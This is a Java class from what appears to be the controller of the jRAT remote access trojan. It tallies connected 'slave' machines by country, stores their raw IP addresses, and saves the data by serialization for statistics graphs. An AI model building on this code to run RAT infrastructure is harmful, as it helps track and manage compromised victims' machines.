package io.jrat.client.settings;

import io.jrat.client.Slave;
import io.jrat.client.io.Files;
import io.jrat.client.ui.frames.Frame;
import io.jrat.common.Logger;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.ArrayList;
import java.util.List;

import com.redpois0n.graphs.country.Country;

public class Statistics extends AbstractSettings implements Serializable {

	private static final long serialVersionUID = -7692558803046215384L;

	private static final Statistics instance = new Statistics();

	private transient List<StatEntry> list = new ArrayList<StatEntry>();

	public static Statistics getGlobal() {
		return instance;
	}

	public static boolean isTracking() {
		return Settings.getGlobal().getBoolean("stats");
	}

	public List<StatEntry> getList() {
		return list;
	}

	public StatEntry getEntry(String country, String longcountry) {
		if (country.equals("?")) {
			country = "unknown";
		}

		for (int i = 0; i < list.size(); i++) {
			StatEntry entry = list.get(i);
			if (entry.country.equalsIgnoreCase(country)) {
				return entry;
			}
		}

		StatEntry stat = new StatEntry();
		stat.country = country;
		stat.longcountry = longcountry;

		list.add(stat);
		Logger.log("Added: " + country);
		return stat;
	}

	@Override
	@SuppressWarnings("unchecked")
	public void load() throws Exception {
		if (!isTracking()) {
			return;
		}

		ObjectInputStream str = new ObjectInputStream(new FileInputStream(getFile()));
		list = (ArrayList<StatEntry>) str.readObject();
		str.close();
		reload();
	}

	public void save() throws Exception {
		if (!isTracking()) {
			return;
		}

		ObjectOutputStream str = new ObjectOutputStream(new FileOutputStream(getFile()));
		str.writeObject(list);
		str.close();
	}

	public void add(Slave client) {
		if (!isTracking()) {
			return;
		}

		StatEntry entry = getEntry(client.getCountry(), client.getCountry());

		entry.connects++;
		boolean exists = false;
		for (String str : entry.list) {
			if (str.equals(client.getRawIP())) {
				exists = true;
			}
		}
		if (!exists) {
			entry.list.add(0, client.getRawIP());
		}
		reload();
	}

	public void reload() {
		Frame.panelStats.totalGraph.clear();
		Frame.panelStats.uniqueGraph.clear();

		for (int i = 0; i < list.size(); i++) {
			StatEntry entry = list.get(i);
			try {

				Country total = new Country(entry.getCountry(), entry.getConnects());
				Country unique = new Country(entry.getCountry(), entry.getList().size());

				Frame.panelStats.totalGraph.add(total);
				Frame.panelStats.uniqueGraph.add(unique);
				Frame.panelStats.repaint();

			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}

	public int getNoConnects() {
		int no = 0;
		for (StatEntry e : list) {
			no += e.connects;
		}
		return no;
	}

	public int getDifferentConnects() {
		int no = 0;
		for (StatEntry e : list) {
			no += e.list.size();
		}
		return no;
	}

	public class StatEntry implements Serializable {

		private static final long serialVersionUID = 8462429809223243541L;

		private String country = "Unknown";
		private String longcountry = "Unknown";
		private Integer connects = 0;
		private List<String> list = new ArrayList<String>();

		public String getCountry() {
			return country;
		}

		public void setCountry(String country) {
			this.country = country;
		}

		public String getLongCountry() {
			return longcountry;
		}

		public void setLongCountry(String longcountry) {
			this.longcountry = longcountry;
		}

		public int getConnects() {
			return connects;
		}

		public void setConnects(int connects) {
			this.connects = connects;
		}

		public List<String> getList() {
			return list;
		}

		public void setList(List<String> list) {
			this.list = list;
		}

	}

	@Override
	public File getFile() {
		return new File(Files.getSettings(), ".stats");
	}

}
